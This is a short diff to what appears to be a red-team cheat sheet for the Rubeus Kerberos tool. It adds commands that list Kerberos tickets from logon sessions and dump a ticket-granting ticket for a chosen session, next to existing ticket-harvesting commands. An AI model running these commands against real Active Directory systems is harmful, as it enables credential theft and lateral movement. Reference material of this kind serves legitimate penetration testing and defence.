@@ -500,6 +500,9 @@ Get tickets currently on System:
 - All - ```Rubeus.exe harvest /interval:30```
 - Specific User on Machine - ```rubeus.exe monitor /targetuser:Mary /interval:10 /nowrap```
 
+- List all kerberos tickets from current logon sessions - ```Rubeus.exe triage```
+- Steal TGT from a specific Logon Session - ```Rubeus.exe dump /luid:0x6042e /service:krbtgt```
+
 #### Tgtdeleg
 Free (lowprev) ticket for existing user session: ```rubeus.exe tgtdeleg```
 
